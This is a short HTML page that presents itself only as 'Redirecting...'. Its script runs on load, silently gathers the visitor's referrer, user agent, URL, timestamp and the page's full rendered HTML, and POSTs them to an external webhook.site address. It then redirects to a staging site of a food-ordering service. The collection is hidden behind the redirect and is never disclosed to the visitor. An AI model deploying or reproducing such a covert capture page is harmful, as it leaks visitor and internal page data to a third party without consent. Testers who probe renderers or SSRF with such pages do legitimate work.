<!DOCTYPE html>
<html>
  <head>
    <title>Redirecting...</title>
    <script>
      // Construct the full URL with referrer, user agent, timestamp, and DOM content
      const webhookUrl = "https://webhook.site/d9339d40-0ae9-49cd-a44e-745f29893082";
      const payload = {
        referrer: document.referrer,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString(),
        url: window.location.href,
        html: document.documentElement.innerHTML // Capture full rendered HTML
      };

      // Send data to webhook
      fetch(webhookUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
      }).finally(() => {
        // Redirect after data is sent
        window.location.href = "https://staging.10bis.co.il/next/en/"; // <- change to final destination
      });
    </script>
  </head>
  <body>
    Redirecting...
  </body>
</html>
